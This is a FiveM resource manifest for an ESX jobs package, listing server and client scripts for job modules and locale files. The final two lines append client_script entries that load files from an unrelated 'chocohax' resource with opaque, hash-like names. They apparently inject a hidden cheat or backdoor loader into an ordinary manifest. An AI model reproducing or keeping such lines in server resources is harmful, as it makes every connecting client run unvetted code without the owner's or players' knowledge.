version '1.0.0'

server_scripts {
  '@mysql-async/lib/MySQL.lua',
  '@es_extended/locale.lua',
  'locales/br.lua',
  'locales/de.lua',
  'locales/en.lua',
  'locales/fr.lua',
  'config.lua',
  'server/esx_jobs_sv.lua'
}

client_scripts {
  '@es_extended/locale.lua',
  'locales/br.lua',
  'locales/de.lua',
  'locales/en.lua',
  'locales/fr.lua',
  'config.lua',
  'jobs/fisherman.lua',
  'jobs/fuel.lua',
  'jobs/lumberjack.lua',
  'jobs/miner.lua',
  'jobs/reporter.lua',
  'jobs/slaughterer.lua',
  'jobs/textil.lua',
  'jobs/casino.lua',
  'jobs/ambulance.lua',
  'client/esx_jobs_cl.lua'
}

client_script '@chocohax/95158.lua'
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'